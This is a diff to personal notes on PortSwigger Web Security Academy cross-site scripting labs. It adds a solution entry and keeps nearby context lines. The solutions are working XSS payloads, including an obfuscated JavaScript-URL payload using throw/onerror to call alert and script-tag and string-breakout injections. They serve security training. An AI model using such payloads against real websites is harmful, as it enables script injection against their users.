@@ -30,7 +30,7 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascrip
 </script><script>alert(1)</script>
 
 
-## Topic Here 
+## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 
 **Chapter:**
 
@@ -47,6 +47,29 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascrip
 \'-alert(1)//
 
 
+## Reflected XSS in a JavaScript URL with some characters blocked
+
+**Chapter:** 
+
+https://portswigger.net/web-security/cross-site-scripting/contexts
+  
+**Lab:**
+
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
+  
+**Limitations:** NA
+
+**Solution:** 
+
+``` https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 ```
+
+
+  **solution:** 
+
+
+
+
+
 
 # Template:
 ## Topic Here 
@@ -54,6 +77,7 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascrip
 **Chapter:**
   
 **Lab:**
+
   
 **Limitations:** NA
 
